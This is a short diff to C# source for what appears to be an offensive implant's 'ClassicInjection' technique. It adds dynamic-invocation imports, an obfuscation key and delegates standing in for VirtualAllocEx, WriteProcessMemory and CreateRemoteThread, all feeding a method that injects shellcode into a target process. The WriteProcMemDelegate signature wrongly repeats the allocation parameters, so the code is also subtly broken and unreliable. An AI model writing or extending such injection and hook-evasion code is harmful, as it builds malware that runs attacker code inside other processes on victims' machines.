@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using Invoker.Data;
+using Invoker.Dynamic;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -11,6 +13,10 @@ namespace Agent
     internal class ClassicInjection : ITechnique
     {
         int ITechnique.id => 1;
+        private long key = 0x617468656E61;
+        private delegate IntPtr VirtAllocExDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwSize, Native.AllocationType flAllocationType, Native.MemoryProtection flProtect);
+        private delegate IntPtr WriteProcMemDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwSize, Native.AllocationType flAllocationType, Native.MemoryProtection flProtect);
+        private delegate IntPtr CrtDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwStackSize, IntPtr lpStartAddress);
         public bool Inject(byte[] shellcode, IntPtr hTarget)
         {
             return this.Run(hTarget, shellcode);
